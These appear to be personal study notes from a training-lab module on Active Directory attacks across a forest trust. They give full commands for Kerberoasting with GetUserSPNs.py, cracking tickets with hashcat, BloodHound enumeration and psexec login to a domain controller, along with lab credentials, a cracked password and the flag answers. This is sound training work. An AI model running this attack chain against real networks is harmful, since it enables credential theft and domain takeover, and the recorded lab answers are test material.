
>[!info] Kerberoasting across trust domains can be executed from a Linux host with the `GetUserSPNs.py` tool

##### Using GetUserSPNs.py
```go
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

>[!hint]
> Using the `-request` flag will issue the TGS ticket. Adding the flag `-outputfile <FILE_NAME>` will put the hash into a text file


```go
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -output wley_hash
```

>[!warning] Hashcat Mode!
>Use mode 13100 when cracking the hash after Kerberoasting the account(s)


### Hunting Foreign Group Membership with Bloodhound-python

>[!hint]
> Edit your `/etc/resolv.conf` file to account for the FREIGHTLOGISTICS.LOCAL domain, adding the domain name and the IP address as the nameserver

![[Pasted image 20260511162150.png]]
##### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
```go
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

##### Compressing the File with zip -r

Compress this file, then upload to bloodhound
```go
zip -r ilfreight_bh.zip *.json
```

>[!abstract]
> After uploading to Bloodhound. Go to the Analysis tab:
> - Select `Users with Foreign Domain Group Membership`
> - Select `INLANEFREIGHT.LOCAL` as the source


------------------------------


SSH
```go
sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.83.90
```

# Questions

#### Question 1: Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.

Answer:
```go
sapsso
```

Getting the Service Principal Name of other users
```go
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

#### Question 2:  Crack the TGS and submit the cleartext password as your answer.

Answer:
```go
pabloPICASSO
```

```go
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -output sapsso_hash
```

```go
hashcat -m 13100 sapsso_hash /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260511170407.png]]

#### Question 3: Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.

Answer:
```go
burn1ng_d0wn_th3_f0rest!
```

```go
psexec.py ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@172.16.5.238
```
